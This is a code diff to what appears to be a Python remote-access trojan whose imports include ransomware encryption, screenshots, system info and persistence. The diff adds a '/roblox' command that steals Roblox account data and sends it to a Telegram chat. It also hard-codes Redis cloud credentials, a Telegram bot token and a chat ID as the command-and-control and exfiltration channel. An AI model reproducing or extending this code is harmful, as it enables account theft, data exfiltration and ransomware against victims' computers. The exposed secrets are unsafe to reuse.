@@ -27,17 +27,23 @@ from libs.ransomware import MultithreadedFileEncryptor
 from libs.screenshot import screen_save
 from libs.system_info import get_systeminfo as systinfo
 import libs.persistence as persistence_lib
+from libs.roblox import steal_roblox
 
 
-REDIS_HOST = ""
-REDIS_PORT = 000
-REDIS_PASS = ""
+# REDIS_HOST = ""
+# REDIS_PORT = 000
+# REDIS_PASS = ""
 
-TELEGRAM_BOT_TOKEN = ""
-NOTIFY_CHATID = ""
+# TELEGRAM_BOT_TOKEN = ""
+# NOTIFY_CHATID = ""
+
+REDIS_HOST = "redis-10126.c212.ap-south-1-1.ec2.redns.redis-cloud.com"
+REDIS_PORT = 10126
+REDIS_PASS = "9HLUf4WD9z3ycFYinde3LZg4qDKTUSIU"
 
 
-
+TELEGRAM_BOT_TOKEN= "7790988267:AAEdQCnp0AjzxBHDubRdkQT19LwXT5a5Qtc"
+NOTIFY_CHATID = "7186259386"
 
 redis_client = redis.Redis(
     host= REDIS_HOST,
@@ -1263,6 +1269,12 @@ async def handle_status(data, *args):
     """Send the status of the computer."""
     
     await send_message(NOTIFY_CHATID, f"Computer {COMPUTER_ID} is active.")
+
+@command_handler("/roblox")
+async def handle_status(data, *args):
+    for i in steal_roblox():
+        await send_markdown(chat_id=NOTIFY_CHATID, markdown_text=i)
+
 
 
 async def register_computer():
